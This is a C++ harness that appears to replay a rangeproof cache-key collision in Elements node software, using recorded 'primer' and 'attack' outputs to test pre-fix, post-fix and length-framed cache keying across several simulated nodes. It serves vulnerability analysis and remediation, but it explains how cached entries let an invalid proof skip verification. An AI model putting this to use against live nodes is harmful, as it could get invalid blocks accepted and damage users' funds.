/* cache_split.cpp
 *
 * Replays the Elements rangeproof-cache path for the two on-chain outputs
 *
 *   primer  71c93d4339fe...f411 : vout 0   (block 4050335)
 *   attack  f24a4b179b5c...183f : vout 1   (block 4050336)
 *
 * using ElementsProject/elements src/cuckoocache.h VERBATIM and a faithful
 * replica of CachingRangeProofChecker::VerifyRangeProof (src/script/sigcache.cpp)
 * in both its pre-fix and post-fix keying, with real secp256k1-zkp underneath.
 */
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <cctype>
#include <string>
#include <vector>
#include <array>
#include <random>
extern "C" {
#include <secp256k1.h>
#include <secp256k1_generator.h>
#include <secp256k1_rangeproof.h>
}
#include "shim/sha256.h"

/* ---- minimal uint256 + the upstream SignatureCacheHasher ---- */
struct uint256 {
    std::array<unsigned char,32> d{};
    unsigned char* begin() { return d.data(); }
    const unsigned char* begin() const { return d.data(); }
    bool operator==(const uint256& o) const { return d == o.d; }
    std::string hex() const { char b[65]; for(int i=0;i<32;i++) sprintf(b+2*i,"%02x",d[i]); return std::string(b,64); }
};
class SignatureCacheHasher {
public:
    template <uint8_t hash_select>
    uint32_t operator()(const uint256& key) const {
        static_assert(hash_select < 8, "SignatureCacheHasher only has 8 hashes available.");
        uint32_t u; std::memcpy(&u, key.begin() + 4 * hash_select, 4); return u;
    }
};
#include "src/cuckoocache.h"   /* upstream, unmodified */

/* ---- the output fields exactly as VerifyAmounts hands them to CRangeCheck ---- */
struct Out {
    std::string name;
    std::vector<unsigned char> proof, valcom, assetcom, script;
};

/* ---- SignatureCache, both keyings ---- */
enum KeyMode { PRE_FIX, POST_FIX, FRAMED };
class SignatureCache {
    CSHA256 m_salted;
    CuckooCache::cache<uint256, SignatureCacheHasher> setValid;
public:
    KeyMode mode;
    SignatureCache(KeyMode m, uint64_t salt_seed) : mode(m) {
        unsigned char nonce[32];
        std::mt19937_64 r(salt_seed);
        for (int i = 0; i < 32; i += 8) { uint64_t v = r(); memcpy(nonce + i, &v, 8); }
        m_salted.Write(nonce, 32);   /* upstream writes the 32-byte nonce twice */
        m_salted.Write(nonce, 32);
        setValid.setup_bytes(32u << 20);
    }
    static void WriteLen(CSHA256& h, size_t n) {
        unsigned char le[4] = {(unsigned char)(n), (unsigned char)(n >> 8),
                               (unsigned char)(n >> 16), (unsigned char)(n >> 24)};
        h.Write(le, 4);
    }
    void ComputeEntryRangeProof(uint256& e, const Out& o) const {
        CSHA256 h = m_salted;
        if (mode == FRAMED) {   /* proposed remediation: length-framed fields */
            WriteLen(h, o.proof.size());    h.Write(o.proof.data(), o.proof.size());
            WriteLen(h, o.valcom.size());   h.Write(o.valcom.data(), o.valcom.size());
            WriteLen(h, o.assetcom.size()); h.Write(o.assetcom.data(), o.assetcom.size());
            WriteLen(h, o.script.size());   h.Write(o.script.data(), o.script.size());
            h.Finalize(e.begin()); return;
        }
        h.Write(o.proof.data(), o.proof.size()).Write(o.valcom.data(), o.valcom.size());
        if (mode == POST_FIX)
            h.Write(o.assetcom.data(), o.assetcom.size()).Write(o.script.data(), o.script.size());
        h.Finalize(e.begin());
    }
    bool Get(const uint256& e, bool erase) { return setValid.contains(e, erase); }
    void Set(const uint256& e) { setValid.insert(e); }
};

static secp256k1_context* CTX;
static bool IsUnspendable(const std::vector<unsigned char>& s) { return !s.empty() && s[0] == 0x6a; }

/* faithful replica of CachingRangeProofChecker::VerifyRangeProof */
static bool VerifyRangeProof(SignatureCache& C, bool store, const Out& o, const char** how) {
    uint256 entry; C.ComputeEntryRangeProof(entry, o);
    if (C.Get(entry, !store)) { *how = "CACHE HIT (crypto skipped)"; return true; }
    uint64_t mn, mx; secp256k1_pedersen_commitment com; secp256k1_generator gen;
    if (!secp256k1_pedersen_commitment_parse(CTX, &com, o.valcom.data())) { *how = "commit parse fail"; return false; }
    if (!secp256k1_generator_parse(CTX, &gen, o.assetcom.data()))         { *how = "gen parse fail";    return false; }
    if (!secp256k1_rangeproof_verify(CTX, &mn, &mx, &com, o.proof.data(), o.proof.size(),
                                     o.script.empty() ? nullptr : o.script.data(), o.script.size(), &gen)) {
        *how = "crypto FALSE"; return false;
    }
    if (mn == 0 && !IsUnspendable(o.script)) { *how = "policy min_value==0 on spendable"; return false; }
    if (store) C.Set(entry);
    *how = store ? "crypto TRUE, entry stored" : "crypto TRUE";
    return true;
}

static std::vector<unsigned char> slurp(const char* p) {
    FILE* f = fopen(p, "r"); if (!f) { fprintf(stderr, "missing %s\n", p); exit(2); }
    std::string h; int c; while ((c = fgetc(f)) != EOF) if (isxdigit(c)) h += (char)c; fclose(f);
    std::vector<unsigned char> b(h.size()/2);
    for (size_t i = 0; i < b.size(); i++) b[i] = (unsigned char)strtol(h.substr(2*i,2).c_str(), nullptr, 16);
    return b;
}
static std::vector<unsigned char> gen_of(const std::vector<unsigned char>& wire) {
    if (wire[0] != 0x01) return wire;                 /* already a commitment */
    secp256k1_generator g; std::vector<unsigned char> out(33);
    secp256k1_generator_generate(CTX, &g, wire.data() + 1);
    secp256k1_generator_serialize(CTX, out.data(), &g);
    return out;                                       /* confidential_validation.cpp:379-383 */
}

int main() {
    CTX = secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    {
        unsigned char o[32]; CSHA256 h; h.Write((const unsigned char*)"abc", 3); h.Finalize(o);
        uint256 t; memcpy(t.begin(), o, 32);
        printf("sha256 self-test = %s\n         expected  ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\n\n", t.hex().c_str());
    }

    Out primer{"71c93d43:0 (block 4050335)",
        slurp("data/71c93d43_out0_rangeproof.hex"), slurp("data/71c93d43_out0_commitment.hex"),
        gen_of(slurp("data/71c93d43_out0_asset.hex")), slurp("data/71c93d43_out0_script.hex")};
    Out attack{"f24a...183f:1 (block 4050336)",
        slurp("data/out1_rangeproof.hex"), slurp("data/out1_commitment.hex"),
        gen_of(slurp("data/out1_asset.hex")), slurp("data/out1_script.hex")};

    for (KeyMode m : {PRE_FIX, POST_FIX, FRAMED}) {
        SignatureCache probe(m, 1);
        uint256 kp, ka; probe.ComputeEntryRangeProof(kp, primer); probe.ComputeEntryRangeProof(ka, attack);
        size_t lp = primer.proof.size() + primer.valcom.size() + (m != PRE_FIX ? primer.assetcom.size() + primer.script.size() : 0) + (m == FRAMED ? 16 : 0);
        size_t la = attack.proof.size() + attack.valcom.size() + (m != PRE_FIX ? attack.assetcom.size() + attack.script.size() : 0) + (m == FRAMED ? 16 : 0);
        const char* mname = m == PRE_FIX ? "PRE-FIX " : (m == POST_FIX ? "POST-FIX" : "FRAMED  ");
        const char* mkey  = m == PRE_FIX ? "|| proof || value_commitment"
                          : (m == POST_FIX ? "|| proof || value_commitment || asset_commitment || scriptPubKey"
                                           : "|| len:proof || len:value_commitment || len:asset_commitment || len:scriptPubKey");
        printf("=== %s key : H(salt %s)\n", mname, mkey);
        printf("    primer preimage %4zu B  key %s\n", lp, kp.hex().c_str());
        printf("    attack preimage %4zu B  key %s\n", la, ka.hex().c_str());
        printf("    SAME CACHE ENTRY : %s\n\n", (kp == ka) ? "YES" : "no");
    }

    int hits = 0; const int N = 2000;
    for (int i = 0; i < N; i++) {
        SignatureCache c(POST_FIX, 1000 + i); uint256 a, b;
        c.ComputeEntryRangeProof(a, primer); c.ComputeEntryRangeProof(b, attack); hits += (a == b);
    }
    printf("post-fix collision over %d independent per-process salts : %d/%d\n\n", N, hits, N);

    struct Scenario { const char* node; KeyMode m; bool saw_primer_in_mempool; };
    Scenario S[] = {
        {"A  post-fix build, up since < 4050335, primer transited its mempool", POST_FIX, true},
        {"B  post-fix build, cold start / IBD, primer only seen inside a block", POST_FIX, false},
        {"C  pre-fix build (elements-23.3.3), primer transited its mempool",     PRE_FIX,  true},
        {"D  proposed length-framed key, primer transited its mempool",          FRAMED,   true},
    };
    for (auto& s : S) {
        printf("---- node %s\n", s.node);
        SignatureCache C(s.m, 42); const char* how;
        if (s.saw_primer_in_mempool) {
            bool r = VerifyRangeProof(C, true, primer, &how);
            printf("  ATMP    4050335 primer  store=true   -> %-5s  %s\n", r ? "TRUE" : "FALSE", how);
            bool r2 = VerifyRangeProof(C, true, attack, &how);
            printf("  ATMP    4050336 attack  store=true   -> %-5s  %s\n", r2 ? "TRUE" : "FALSE", how);
        }
        bool rb = VerifyRangeProof(C, false, primer, &how);
        printf("  CONNECT 4050335 primer  store=false  -> %-5s  %s\n", rb ? "TRUE" : "FALSE", how);
        bool ra = VerifyRangeProof(C, false, attack, &how);
        printf("  CONNECT 4050336 attack  store=false  -> %-5s  %s\n", ra ? "TRUE" : "FALSE", how);
        printf("  => block 4050336 : %s\n\n", ra ? "ACCEPTED" : "REJECTED");
    }
    return 0;
}
